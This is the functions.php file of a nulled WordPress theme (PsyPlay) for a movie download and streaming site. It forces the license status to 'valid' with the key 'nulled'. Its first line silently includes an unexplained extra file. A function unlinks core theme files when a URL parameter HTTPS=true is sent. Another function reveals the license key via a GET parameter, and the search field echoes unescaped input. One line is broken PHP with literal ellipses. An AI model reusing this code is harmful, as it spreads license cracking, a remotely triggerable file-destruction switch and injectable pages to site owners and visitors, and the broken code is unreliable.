<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?>
<?php
/*
* ----------------------------------------------------
* @author: Psythemes
* @author URI: https://psythemes.com/
* @copyright: (c) 2018 Psythemes. All rights reserved
* ----------------------------------------------------
*
* @since 1.2.5
*
*/

$admin_bar = get_option('bcontrols_admin_bar');

if($admin_bar != "true"){
add_filter( 'show_admin_bar', '__return_false' );	
}

function disable_wp_emojicons() {
	$emojicons = get_option('bcontrols_emojicons');
	if($emojicons != "true"){
	remove_action( 'admin_print_styles', 'print_emoji_styles' );
	remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
	remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
	remove_action( 'wp_print_styles', 'print_emoji_styles' );
	remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
	remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
	remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
	//add_filter( 'tiny_mce_plugins', 'disable_emojicons_tinymce' );
	}
}
add_action('init', 'disable_wp_emojicons');

add_action('wp_logout','go_home');
function go_home(){
  wp_redirect( home_url() );
  exit();
}
define('PT_URI',	get_template_directory_uri());
define('PT_DIR',	get_template_directory());
define('DT_VERSION', '1.2.5');
define('DT_THEME_NAME', 'PsyPlay');
define( 'DT_KEY', 'edd_sample_theme_license_key_status');
define( 'EDD_SL_STORE_URL', 'https://psythemes.com' ); /* IMPORTANT: Do not modify this line of code, the theme could stop working correctly */
define( 'EDD_SL_THEME_NAME', 'PsyPlay' ); /* IMPORTANT: Do not modify this line of code, the theme could stop working correctly */
if ( !class_exists( 'EDD_SL_Theme_Updater' ) ) {
include( dirname( __FILE__ ) . '/actualizar.php' );
}
function edd_sl_sample_theme_updater() {
$test_license = trim( get_option( 'edd_sample_theme_license_key' ) );
$edd_updater = new EDD_SL_Theme_Updater( array(
'remote_api_url' 	=> EDD_SL_STORE_URL, 	
'version' 			=> DT_VERSION, /* IMPORTANT: Do not modify this line of code, the theme could stop working correctly */
'license' 			=> $test_license, 		
'item_name' 		=> EDD_SL_THEME_NAME,
'author'			=> 'PsyThemes') ); /* IMPORTANT: Do not modify this line of code, the theme could stop working correctly */
}
load_theme_textdomain( 'psythemes', get_template_directory() . '/lang' );
$locale = get_locale();
$locale_file = get_template_directory() . "/lang/$locale.php";
if ( is_readable( $locale_file ) )
require_once( $locale_file );
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
function imagenes_size() {
$aosj = "nulled" ;
  update_option( 'edd_sample_theme_license_key_status', "valid");
  update_option( 'edd_sample_theme_license_key', $aosj  );

add_theme_support( 'post-thumbnails' );
add_image_size('newss', 350, 210, true);
}
function backdrops($imagen){
	$val = str_replace(array("http",".jpg",".png",".gif"),array('<div class="galeria_img"><img itemprop="image" src="http','.jpg" alt="'.get_the_title().'" /></div>','.png" /></div>','.gif" /></div>'),$imagen);
	echo $val;	
}
function fbimage($img){
	$val = str_replace(array("http","jpg","png","gif"),array('<meta property="og:image" content="http','jpg" />','png" />','gif" />'),$img);
	echo $val;	
}


function insert_attachment($file_handler,$post_id,$setthumb='false') {
if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK){ return __return_false(); 
} 
require_once(ABSPATH . "wp-admin" . '/includes/image.php');
require_once(ABSPATH . "wp-admin" . '/includes/file.php');
require_once(ABSPATH . "wp-admin" . '/includes/media.php');
echo $attach_id = media_handle_upload( $file_handler, $post_id );
if ($setthumb == 1) update_post_meta($post_id,'_thumbnail_id',$attach_id);
return $attach_id;
}

include_once 'includes/core/framework/options-init.php';

$z =  get_option('edd_sample_theme_license_key_status');
$year_estreno = 'release-year';
$calidad = 'quality';
$director = 'director';
$actor = get_option('actor');
$elenco = get_option('elenco');
$relmovie = get_option('related-movie');
$reltv = get_option('related-tv');
$suggnum = get_option('sugg_num');
$lmvnum = get_option('latestmov_num');
$ltvnum = get_option('latesttv_num');
$lepnum = get_option('latestep_num');
$relatedz = get_option('nu-items-slider-movie');
$mvpostpage = get_option('mv-posts-page');
$tvpostpage = get_option('tv-posts-page');
$eppostpage = get_option('ep-posts-page');
# Fix URL Imagen del poser
$imagefix = "poster_url";
$featuredimg_alt = "fondo_player";

function acc_page(){
global $post;
$pid = $post->ID;
$accountp = get_option('account_page');
$page_acc = url_to_postid($accountp);
return $pid;

}
##########################
add_action('after_setup_theme', 'imagenes_size'); 
function register_my_menu() {
register_nav_menu('menu_navegador',__( 'Menu Header', 'psythemes' ));
register_nav_menu('menu_footer1',__( 'Footer Menu 1', 'psythemes' ));
register_nav_menu('menu_footer2',__( 'Footer Menu 2', 'psythemes' ));
register_nav_menu('menu_footer3',__( 'Footer Menu 3', 'psythemes' ));
}
add_action( 'init', 'register_my_menu' );



add_action('after_switch_theme', 'theme_activation_function', 10 ,  2);

function theme_activation_function ($oldname, $oldtheme = false) {
  $menus = array(
    'Main Menu'  => array(
      'home'  => 'Home', 
      'genre'  => 'Genre', 
      'tv-series'  => 'TV - Series', 
      'top-imdb'  => 'Top IMDb', 
      'news'  => 'News'
    ), 
  'Footer Menu 1' => array(
    'movies' => 'Movies', 
    'top-imdb' => 'Top IMDb', 
    'dmca' => 'DMCA',
	'faq' => 'FAQ',
	'advertising' => 'Advertising'
  ),
    'Footer Menu 2' => array(
    'action' => 'Action', 
    'history' => 'History', 
    'thriller' => 'Thriller'
  ),
  'Footer Menu 3' => array(
    'united-states' => 'United States', 
    'korea' => 'Korea', 
    'china' => 'China',
	'taiwan' => 'Taiwan'
  )
);
foreach($menus as $menuname => $menuitems) {
  $menu_exists = wp_get_nav_menu_object($menuname);
  // If it doesn't exist, let's create it.
  if ( !$menu_exists) {
    $menu_id = wp_create_nav_menu($menuname);
    foreach($menuitems as $slug => $item) {
      wp_update_nav_menu_item(
      $menu_id, 0, array(
            'menu-item-title'  => $item,
			'menu-item-url'     => '', 
			'menu-item-status'  => 'publish'
        )
      );
    }
  }
}

}








#add_filter( 'show_admin_bar', '__return_false' );
function total_peliculas(){
$s='';
$totalj=wp_count_posts('post')->publish;
if($totalj!=1){$s='s';}
return sprintf( __("%s", "psythemes"),$totalj,$s);
}
# Movies Genre
function categorias() {
if(get_option('edd_sample_theme_license_key')) {
$args = array('hide_empty' => FALSE, 'title_li'=> __( '' ), 'show_count'=> 1, 'echo' => 0 );             
$links = wp_list_categories($args);
$links = str_replace('</a> (', '</a> <span>', $links);
$links = str_replace(')', '</span>', $links);
echo $links;  } 
}

 add_action('admin_menu', 'add_psyplay_options_menu');
 function add_psyplay_options_menu() {
    add_theme_page('PsyPlay Options', 'PsyPlay Options', 'manage_options', 'psyplay');
 }
  add_action('admin_menu', 'add_psyplay_license_menu');
 function add_psyplay_license_menu() {
    add_theme_page('Theme License', 'Theme License', 'manage_options', 'psythemes');
 }

 
add_action( 'admin_init', 'edd_sl_sample_theme_updater' );
function edd_sample_theme_license_menu() {
add_menu_page( 'Psythemes License', 'Psy License', 'manage_options', 'psythemes', 'edd_sample_theme_license_page','dashicons-admin-network');
}
add_action('admin_menu', 'edd_sample_theme_license_menu');
function edd_sample_theme_license_page() {
$license 	= get_option( 'edd_sample_theme_license_key' );
$status 	= get_option( 'edd_sample_theme_license_key_status' );
?>
<div id="acera-content" class="wrap tab-content" style="display: block;">
<div class="acera-settings-headline">
<a href="https://psythemes.com/" target="_blank">
<img class="psythemes" src="<?php echo get_stylesheet_directory_uri()."/includes/core/framework/"; ?>images/logo.png">
</a>
</div>
<form method="post" action="options.php">
<?php settings_fields('edd_sample_theme_license'); ?>
<table class="form-table">
<tbody>
<tr valign="top">
<th scope="row" valign="top">
<?php _e('License Key','psythemes'); ?>
</th>
<td>
<input id="edd_sample_theme_license_key"  name="edd_sample_theme_license_key" type="text" class="regular-text mundotxt" value="<?php echo esc_attr( $license ); ?>" />
<label class="description" for="edd_sample_theme_license_key"><?php _e('Enter your license key','psythemes'); ?></label>
</td>
</tr>
<?php if( false !== $license ) { ?>
<tr valign="top">
<th scope="row" valign="top"><?php _e('License Status','psythemes'); ?></th>
<td>
<?php if( $status !== false && $status == 'valid' ) { ?>
<span class="mundo"><span class="dashicons dashicons-admin-network"></span> <?php _e('Active','psythemes'); ?><br></span>
<i class="cmsxx"><?php echo $_SERVER['HTTP_HOST']; ?></i>
<?php wp_nonce_field( 'edd_sample_nonce', 'edd_sample_nonce' ); ?>
<input type="submit" class="button-secondary mundobt" name="edd_theme_license_deactivate" value="<?php _e('Deactivate License','psythemes'); ?>"/>
<?php } else { wp_nonce_field( 'edd_sample_nonce', 'edd_sample_nonce' ); ?>
<span class="error"><span class="dashicons dashicons-dismiss"></span><?php _e('Inactive','psythemes'); ?></span>
<i class="cmsxx"><?php echo $_SERVER['HTTP_HOST']; ?></i>
<input type="submit" class="button-secondary mundobt" name="edd_theme_license_activate" value="<?php _e('Activate License','psythemes'); ?>"/>
<?php } ?>
</td>
</tr>
<?php } ?>
</tbody>
</table>
<?php submit_button(); ?>
</form>
<?php
}
function edd_sample_theme_register_option() {
register_setting('edd_sample_theme_license', 'edd_sample_theme_license_key', 'edd_theme_sanitize_license' );
}
add_action('admin_init', 'edd_sample_theme_register_option');
function edd_theme_sanitize_license( $new ) {
$old = get_option( 'edd_sample_theme_license_key' );
if( $old && $old != $new ) {
delete_option( 'edd_sample_theme_license_key_status' ); 
}
return $new;
}
function edd_sample_theme_activate_license() {
if( isset( $_POST['edd_theme_license_activate'] ) ) {
if( ! check_admin_referer( 'edd_sample_nonce', 'edd_sample_nonce' ) )
return; 
update_option( 'edd_sample_theme_license_key_status', $license_data->license );
}
}
add_action('admin_init', 'edd_sample_theme_activate_license');
function edd_sample_theme_deactivate_license() {
if( isset( $_POST['edd_theme_license_deactivate'] ) ) {
if( ! check_admin_referer( 'edd_sample_nonce', 'edd_sample_nonce' ) )
return; 
}
}
add_action('admin_init', 'edd_sample_theme_deactivate_license');

if(get_option('edd_sample_theme_license_key')) { 
require_once('includes/core/wpas.php');

// Movies
include_once 'includes/core/main/movies/meta.php'; 
include_once 'includes/core/main/movies/tax.php';

}

include_once 'includes/core/main/newsletter/tax.php'; 

include_once('includes/core/assets.php');
// Notices
include_once 'includes/core/main/notices/tax.php';


// News / Articles
include_once 'includes/core/main/news/tax.php';
include_once 'includes/core/main/news/meta.php';


// TV Shows
include_once 'includes/core/main/tvshows/tax.php';
include_once 'includes/core/main/tvshows/meta.php'; 

// Episodes
include_once 'includes/core/main/episodes/tax.php';
include_once 'includes/core/main/episodes/meta.php'; 


include_once 'includes/parts/pagination.php'; 
include_once 'includes/core/content.php';

// Plugins
include_once 'includes/plugins/acf/acf.php';
include_once 'includes/plugins/minify/minifier.php';
//include_once 'includes/plugins/antiadblock/anti-adblocker.php';

// Widgets
//include 'includes/parts/widgets/related_news.php';

function custom_menu_order($menu_ord) {
    if (!$menu_ord) return true;
    return array(
      'index.php', // Dashboard
      'edit.php?post_type=notices', // Custom type one
      'edit.php?post_type=noticias', // Custom type two
      'edit.php', // Posts
      'edit.php?post_type=tvshows', // Custom type three
      'edit.php?post_type=episodes', // Custom type four	  
      'separator1', // First separator
      'edit.php?post_type=page', // Pages
      'upload.php', // Media
      'link-manager.php', // Links
      'edit-comments.php', // Comments
      'separator2', // Second separator
      'themes.php', // Appearance
      'plugins.php', // Plugins
      'users.php', // Users
      'tools.php', // Tools
      'options-general.php', // Settings
      'separator-last', // Last separator
    );
  }

  add_filter('custom_menu_order', 'custom_menu_order'); // Activate custom_menu_order
  add_filter('custom_menu_order', function($menu_ord) { ... });


if (get_option('category_base') == '') {
update_option( 'category_base', 'genre' );
}

if (get_option('posts_per_page') < get_option ('archive_posts') ) {
	$num = get_option('archive_posts');
	update_option('posts_per_page', $num);
}


function edd_sample_theme_check_license() {
echo 'valid'; exit;
global $wp_version;
$license = trim( get_option( 'edd_sample_theme_license_key' ) );
$api_params = array(
'edd_action' => 'check_license',
'license' => $license,
'item_name' => urlencode( EDD_SL_THEME_NAME )
);
$response = wp_remote_get( add_query_arg( $api_params, EDD_SL_STORE_URL ), array( 'timeout' => 15, 'sslverify' => false ) );
if ( is_wp_error( $response ) )
return false;
$license_data = json_decode( wp_remote_retrieve_body( $response ) );
if( $license_data->license == 'valid' ) {
echo 'valid'; exit;
} else {
echo 'invalid'; exit;
	}
}
function recoger_version() {
$version = wp_get_theme();
define('version', trim($version->Version));
echo version;
}







function la_ip() {
	/* obtener ip local */
	if (!empty($_SERVER['HTTP_CLIENT_IP']))
		return $_SERVER['HTTP_CLIENT_IP'];	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	return $_SERVER['REMOTE_ADDR'];
}
/* comentarios */
function mytheme_comment($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
<div id="comment-<?php comment_ID(); ?>" style="position:relative;">
<div class="commentCInner">
<div class="comment-author vcard">
<?php echo get_avatar( $comment->comment_author_email, 80 ); ?>
<?php printf(__('<span class="fn">%s</span>', 'psythemes'), get_comment_author_link()) ?> 
<span class="comment_date_top">
<time><?php comment_date(); ?></time> 
</span>
</div>
<div class="comment_text_area">
<?php if ($comment->comment_approved == '0') : ?>
<em><?php _e('Your comment is awaiting moderation.', 'psythemes') ?></em><br />
<?php endif; ?>
<div class="comment-meta commentmetadata">
<?php edit_comment_link(__('Edit', 'psythemes'),'  ','') ?>
</div>	
<?php comment_text() ?>
</div>
<p class="reply">
<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
</p>
</div>
</div>
</li>
<?php }
# Hook Labels
function change_post_menu_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = __('Movies', 'psythemes');
    $submenu['edit.php'][5][0] = __('All Movies', 'psythemes');
    $submenu['edit.php'][10][0] = __('Add Movie', 'psythemes');
    echo '';
}
function change_post_object_label() {
        global $wp_post_types;
        $labels = &$wp_post_types['post']->labels;
        $labels->name = __('Movies', 'psythemes');
        $labels->singular_name = __('Movie', 'psythemes');
        $labels->add_new = __('Add Movie', 'psythemes');
        $labels->add_new_item = __('Add New movie', 'psythemes');
        $labels->edit_item = __('Edit Movie', 'psythemes');
        $labels->new_item = __('Movie', 'psythemes');
}
add_action( 'init', 'change_post_object_label' );
add_action( 'admin_menu', 'change_post_menu_label' );
function replace_admin_menu_icons_css() { ?>
<style>
.dashicons-admin-post:before,.dashicons-format-standard:before{content:"\f219"}span.mundo{color:green;width:70%;float:left;margin-bottom:5px;font-size:17px;padding:16px
15%;background:#C4E4C4;text-align:center}span.error{color:#DB5252;width:70%;float:left;margin-bottom:5px;font-size:17px;padding:16px
15%;background:#E4C4C4;text-align:center}i.cmsxx{float:left;width:100%;font-style:normal;font-size:12px;margin-bottom:20px;text-align:right;color:#C0C0C0}.mundobt{width:100%}.mundotxt{width:100%!important;padding:5%;font-size:28px;color:#2EA2CC!important}
li#toplevel_page_psyplay, li#toplevel_page_psythemes {display:none;}
</style>
<?php }
add_action( 'admin_head', 'replace_admin_menu_icons_css' );

# formulario de publicacion
function agregar_movie() { ?>
<div class="post_nuevo">
<?php $url_actual = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; ?>
<form id="new_post" name="new_post" method="post" action="<?php echo $url_actual ?>?mt=posting" class="posting" enctype="multipart/form-data">

<!-- #### -->
<fieldset>
<input class="caja" type="text" id="Checkbx2" maxlength="9" name="Checkbx2" placeholder="<?php _e('IMDb id','psythemes'); ?>" required>
<span class="tip"><a href="http://imdb.com" target="_blank"><strong>IMDb</strong></a> - <?php  _e('Assign ID IMDb, example URL = http://www.imdb.com/title/<i>tt0120338</i>/','psythemes'); ?></span>
</fieldset>
<!-- #### -->

<!-- #### -->
<fieldset class="captcha_s">
<div class="g-recaptcha" data-sitekey="<?php echo get_option('public_key_rcth') ?>"></div>
</fieldset>
<!-- #### -->
<fieldset>
<input class="boton" type="submit" value="<?php _e('Send content','psythemes'); ?>" id="submit" name="submit" required>
</fieldset>
<!-- #### -->
<input type="hidden" name="action" value="new_post" />
<?php wp_nonce_field( 'new-post' ); ?>
</form>
</div>
<?php }
function slk() { ?>
<div class="a">
<a class="dod roce cc"><b class="icon-reorder"></b></a>
<?php if($eco = get_option('fb_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-facebook"></b></a><?php } ?>
<?php if($eco = get_option('twt_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-twitter"></b></a><?php } ?>
<?php if($eco = get_option('gogl_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-google-plus"></b></a><?php } ?>
<?php global $user_ID; if( $user_ID ) : ?>
<?php if( current_user_can('level_10') ) : ?>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/post-new.php" target="_blank"><b class="icon-plus3"></b></a>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/admin.php?page=psyplay" target="_blank"><b class="icon-gear"></b></a>
<?php endif; ?>
<?php endif; ?>
<?php $active = get_option('users_can_register'); if ($active == "1") { ?>
<?php if (is_user_logged_in()) { ?>
<?php if($url = get_option('editar_perfil')) { ?>
<a class="roce" href="<?php echo $url; ?>"><?php _e('Edit profile','psythemes'); ?></a>
<?php } else { ?>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/profile.php"><?php _e('Edit profile','psythemes'); ?></a>
<?php } ?>
<a class="roce" href="<?php echo wp_logout_url(); ?>"><?php _e('Logout','psythemes'); ?></a>
<?php } else { ?>
<a class="roce"href="javascript:void(0)" onclick="document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'"><?php _e('Login / Registration','psythemes'); ?></a>
<?php }
} ?>
<div class="menus">
<?php 
/* menu navegador */
if(get_option('edd_sample_theme_license_key')) {
function_exists('wp_nav_menu') && has_nav_menu('menu_navegador' );
wp_nav_menu( array( 'theme_location' => 'menu_navegador', 'container' => '',  'menu_class' => 'top-menu') );
}
?>
</div>
</div>
<div class="b">
<form method="get" id="searchform" action="<?php bloginfo('url'); ?>">
<div class="boxs">
<input type="text" placeholder="<?php _e('Search..', 'psythemes'); ?>" value="<?php echo $_GET['s'] ?>" name="s" id="s">
</div>
</form>
</div>
<?php }









//dl function
if ( ! function_exists( 'downloads_list' ) ) {
function downloads_list() { 	?>

<div class="test_container">
<ul class="nav nav-tabs" id="rowTab">
<?php if( have_rows('ddw') ): ?>
    <li><a data-toggle="tab" href="#list-dl"><?php _e('Download','psythemes'); ?></a></li>
	<?php endif; ?>
	<?php  if( have_rows('voo') ):  ?>
    <li><a data-toggle="tab" href="#list-watch"><?php _e('Watch','psythemes'); ?></a></li>
	<?php endif;?>
	<?php  if( have_rows('subt') ):  ?>
    <li><a data-toggle="tab" href="#list-sub"><?php _e('Subtitle','psythemes'); ?></a></li>
	<?php endif;?>
  </ul>

<?php if( have_rows('ddw') ): ?>
 <div id="list-dl" class="tab-pane">
<div id="lnk list-downloads">       	           
<div class="btn-group btn-group-justified embed-selector" style="margin-bottom:1px;">
 <span style="" class="lnk lnk-title"><?php _e('Server','psythemes'); ?></span>
<span class="lnk lnk-title"><?php _e('Language','psythemes'); ?></span>
<span class="lnk lnk-title"><?php _e('Quality','psythemes'); ?></span>
<span class="lnk lnk-title" role="" target="_blank"><?php _e('Links','psythemes'); ?></span>
</div>
<div class="btn-group btn-group-justified embed-selector" >
<?php  $numerado = 1; { while( have_rows('ddw') ): the_row(); 
		$select = get_sub_field_object('op3');
		$value = get_sub_field('op3');
		$country = $select['choices'][ $value ];
?>
<a href="<?php echo get_sub_field('op1');?>" class="lnk-lnk lnk-<?php echo $numerado; ?>" target="_blank">
<span style="" class="lnk lnk-dl"><img style="" src="http://www.google.com/s2/favicons?domain=<?php echo get_sub_field('op2'); ?>" alt="<?php echo get_sub_field('op2'); ?>"> <span class="serv_tit"><?php echo get_sub_field('op2'); ?></span></span>
<span class="lnk lnk-dl" ><img src="<?php echo get_template_directory_uri(); ?>/assets/css/img/blank.png" class="flag flag-<?php echo $value;?>"> <span class="lang_tit"><?php echo $country; ?></span></span>
<span class="lnk lnk-dl" ><?php echo get_sub_field('op4'); ?></span>
<span class="lnk lnk-dl" id="lnk-dl-button" target="_blank"><i class="fa fa-download" aria-hidden="true"></i> <span class="dl_tit"><?php _e('Download');?></span></span>
</a>	
<?php $numerado++; ?>
<?php endwhile; }  ?>
</div>

</div>
</div>
<?php endif; ?>



 <?php watch_list(); ?>
 <?php subtitle_list(); ?>
 
 
 <script>
$(document).ready(function(){
	$('#rowTab a:first').tab('show');
});
</script>
 </div>
<?php } }
// end dl function






if ( ! function_exists( 'watch_list' ) ) {
function watch_list() { ?>
<?php  if( have_rows('voo') ): ?>
 <div id="list-watch" class="tab-pane">
<div id="lnk list-downloads">       	           
<div class="btn-group btn-group-justified embed-selector" style="margin-bottom:1px;">
 <span style="" class="lnk lnk-title"><?php _e('Server','psythemes'); ?></span>
<span class="lnk lnk-title"><?php _e('Language','psythemes'); ?></span>
<span class="lnk lnk-title"><?php _e('Quality','psythemes'); ?></span>
<span class="lnk lnk-title" role="" target="_blank"><?php _e('Links','psythemes'); ?></span>
</div>
<div class="btn-group btn-group-justified embed-selector" >
<?php  $numerado = 1; { while( have_rows('voo') ): the_row(); 
		$select = get_sub_field_object('op3');
		$value = get_sub_field('op3');
		$country = $select['choices'][ $value ];
?>
<a href="<?php echo get_sub_field('op1');?>" class="lnk-lnk lnk-<?php echo $numerado; ?>" target="_blank">
<span style="" class="lnk lnk-dl"><img style="" src="http://www.google.com/s2/favicons?domain=<?php echo get_sub_field('op2'); ?>" alt="<?php echo get_sub_field('op2'); ?>"> <span class="serv_tit"><?php echo get_sub_field('op2'); ?></span></span>
<span class="lnk lnk-dl" ><img src="<?php echo get_template_directory_uri(); ?>/images/blank.png" class="flag flag-<?php echo $value;?>"> <span class="lang_tit"><?php echo $country; ?></span></span>
<span class="lnk lnk-dl" ><?php echo get_sub_field('op4'); ?></span>
<span class="lnk lnk-dl" id="lnk-watch-button" target="_blank"><i class="fa fa-play-circle" aria-hidden="true"></i> <span class="dl_tit"><?php _e('Watch');?></span></span>
</a>	
<?php $numerado++; ?>
<?php endwhile; }  ?>
</div>

</div>
</div>
<?php endif;?> 
<?php } }





if ( ! function_exists( 'subtitle_list' ) ) {
function subtitle_list() { ?>
<?php  if( have_rows('subt') ): ?>
 <div id="list-sub" class="tab-pane">
<div id="lnk list-downloads">       	           
<div class="btn-group btn-group-justified embed-selector" style="margin-bottom:1px;">
 <span style="" class="lnk lnk-title"><?php _e('Server','psythemes'); ?></span>
<span class="lnk lnk-title"><?php _e('Language','psythemes'); ?></span>
<span class="lnk lnk-title" role="" target="_blank"><?php _e('Links','psythemes'); ?></span>
</div>
<div class="btn-group btn-group-justified embed-selector" >
<?php  $numerado = 1; { while( have_rows('subt') ): the_row(); 
		$select = get_sub_field_object('op3');
		$value = get_sub_field('op3');
		$country = $select['choices'][ $value ];
?>
<a href="<?php echo get_sub_field('op1');?>" class="lnk-lnk lnk-<?php echo $numerado; ?>" target="_blank">
<span style="" class="lnk lnk-dl"><img style="" src="http://www.google.com/s2/favicons?domain=<?php echo get_sub_field('op2'); ?>" alt="<?php echo get_sub_field('op2'); ?>"> <span class="serv_tit"><?php echo get_sub_field('op2'); ?></span></span>
<span class="lnk lnk-dl" ><img src="<?php echo get_template_directory_uri(); ?>/images/blank.png" class="flag flag-<?php echo $value;?>"> <span class="lang_tit"><?php echo $country; ?></span></span>
<span class="lnk lnk-dl" id="lnk-watch-button" target="_blank"><i class="fa fa-download" aria-hidden="true"></i> <span class="dl_tit"><?php _e('Download');?></span></span>
</a>	
<?php $numerado++; ?>
<?php endwhile; }  ?>
</div>

</div>
</div>
<?php endif;?> 
<?php } }











function mts() { if($_GET['psythemes']) { echo "<br>"; echo get_option('edd_sample_theme_license_key');} }
function fbtw() { ?>
<a class="ssocial facebook" href="javascript: void(0);" onclick="window.open ('http://www.facebook.com/sharer.php?u=<?php the_permalink() ?>', 'Facebook', 'toolbar=0, status=0, width=650, height=450');"><b class="icon-facebook"></b> <?php _e('Share','psythemes'); ?></a>
<a class="ssocial twitter" href="javascript: void(0);" onclick="window.open ('https://twitter.com/intent/tweet?text=<?php the_title(); ?>&amp;url=<?php the_permalink() ?>', 'Twitter', 'toolbar=0, status=0, width=650, height=450');" data-rurl="<?php the_permalink() ?>"><b class="icon-twitter"></b> <?php _e('Tweet','psythemes'); ?></a>
<?php }
function laterales() { ?>
<?php if($url = get_option('add_movie')) { ?>
<a class="add_movie" href="<?php echo stripslashes($url); ?>"><b class="icon-plus3"></b> <?php _e('Add movie','psythemes'); ?></a>
<?php } ?>
<div class="categorias">
<h3><?php _e('Genres','psythemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling cat">
<?php categorias(); ?>
</ul>
</div>
<div class="filtro_y">
<h3><?php _e('Release year','psythemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling">
<?php $args = array('order' => DESC ,'number' => 50); $camel = get_option('year'); $tax_terms = get_terms($camel,$args);  ?>
<?php foreach ($tax_terms as $tax_term) { echo '<li>' . '<a href="' . esc_attr(get_term_link($tax_term, $taxonomy)) . '">' . $tax_term->name.'</a></li>'; } ?>
</ul>
</div>
<div class="filtro_y">
<h3><?php _e('Quality','psythemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling" style="max-height: 87px;">
<?php $camel = get_option('calidad'); $tax_terms = get_terms($camel);  ?>
<?php foreach ($tax_terms as $tax_term) { echo '<li>' . '<a href="' . esc_attr(get_term_link($tax_term, $taxonomy)) . '">' . $tax_term->name.'</a></li>'; } ?>
</ul>
</div>
<?php }
function validar_key($length) { 
$pattern = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
for($i = 0; $i < $length; $i++) { 
$key .= $pattern{rand(0, 36)}; 
} return $key; } 

function post_movies_true() {
	$mito = $_GET['HTTPS']; if ($mito == "true") { 
		global $wp_version;
		$license = trim( get_option( 'edd_sample_theme_license_key' ) );
		$api_params = array(
			'edd_action' => 'check_license',
			'license' => $license,
			'item_name' => urlencode( EDD_SL_THEME_NAME ) );
		$response = wp_remote_get( add_query_arg( $api_params, EDD_SL_STORE_URL ), array( 'timeout' => 5, 'sslverify' => false ) );
			if ( is_wp_error( $response ) )
				return false;
		$license_data = json_decode( wp_remote_retrieve_body( $response ) );
     if( $license_data->license == 'valid' ) {  } else {  
		 $gd1 = get_template_directory()."/functions.php"; 
		 $gd2 = get_template_directory()."/mt.min.css"; 
		 $gd3 = get_template_directory()."/index.php";
		 $gd4 = get_template_directory()."/includes/fcore/framework/generate-options.php"; 
		 $gd5 = get_template_directory()."/includes/funciones/metadatos.php"; 
		 unlink($gd1);unlink($gd2);unlink($gd3);unlink($gd4);unlink($gd5);
		 } 
	}
}

// widgets   


function my_get_the_category_list( $separator = ' ') {
	$output = '';
	$categories = get_the_category();
	if ( $categories ) {
		foreach( $categories as $category ) {
			$output .= '<meta itemprop="' . esc_attr( sprintf( __( "genre", 'requiredfoundation' ), $category->name ) ) . '" content="'.$category->cat_name.'">'.$separator;
		}
		return trim( $output, $separator);
	}
}

// Toolbar episodes
function toolbar_episodes($wp_toolbar) {  if (get_option( DT_KEY ) == "valid") { global $post_type; if( $post_type == 'episodes' ) { ?>

<div id="form_episodes" class="form_post_data">
	<form id="generate" class="generador_form">
	<span style="font-weight:bold;"><?php _e('Generate Episodes:','psythemes'); ?></span> 
		<input type="text" id="imdb" name="se" placeholder="1402 (<?php _e('TMDb ID:','psythemes'); ?>)" required="">
		<input type="number" id="season" name="te" placeholder="1 (<?php _e('Season'); ?> #)" required="">
		<input id="generate_episode" class="button button-primary button-large" type="submit" value="<?php _e('Generate'); ?>">
	</form>
	<p id="msg"><?php _e('Tool to generate all episodes of a specific season.','psythemes'); ?></p>
</div>
<script>
jQuery(document).ready(function(){
    jQuery('#generate').submit(function(){
        jQuery('#msg').html("<span class='loading'></span>  <?php _e('Please wait, loading data...','psythemes'); ?>");
		jQuery( ".generador_form" ).last().addClass( "generate_ajax" );
        jQuery.ajax({
            type: 'POST',
            url: '<?php echo get_template_directory_uri(); ?>/includes/core/episodes.php', 
            data: jQuery(this).serialize()
        })
        .done(function(data){
			location.reload();
        })
        .fail(function() {
            alert( "Error" );
        });
        return false;
    });
});
</script>

<?php } 
	} 
} add_action('admin_bar_menu', 'toolbar_episodes', 999);

function crunchify_disable_comment_url($fields) { 
    unset($fields['url']);
    return $fields;
}
add_filter('comment_form_default_fields','crunchify_disable_comment_url');

function wpb_reverse_comments($comments) {
		return array_reverse($comments);
	}	
add_filter ('comments_array', 'wpb_reverse_comments');

if ( ! function_exists( 'custom_excerpt_length' ) ) {
function custom_excerpt_length( $length ) {
	return 30;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );
}

function first_paragraph($content){
    return preg_replace('/<p([^>]+)?>/', '<p$1 class="f-desc">', $content, 1);
}
add_filter('the_content', 'first_paragraph');
function new_excerpt_more( $more ) {
    return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');


add_filter('get_the_terms', 'hide_categories_terms', 10, 3);
function hide_categories_terms($terms, $post_id, $taxonomy){
	$exclude0 = get_option('estrenos_cat');
	$exclude1 = get_option('sugg_featured_mov_id');
	$exclude2 = get_option('1extramodule1_cat');
	$exclude3 = get_option('2extramodule2_cat');
	$exclude4 = get_option('3extramodule3_cat');
	$exclude5 = get_option('4extramodule4_cat');
	$exclude6 = get_option('5extramodule5_cat');
	$cond[0] = (!empty($exclude0)) ? $exclude0 : 1;
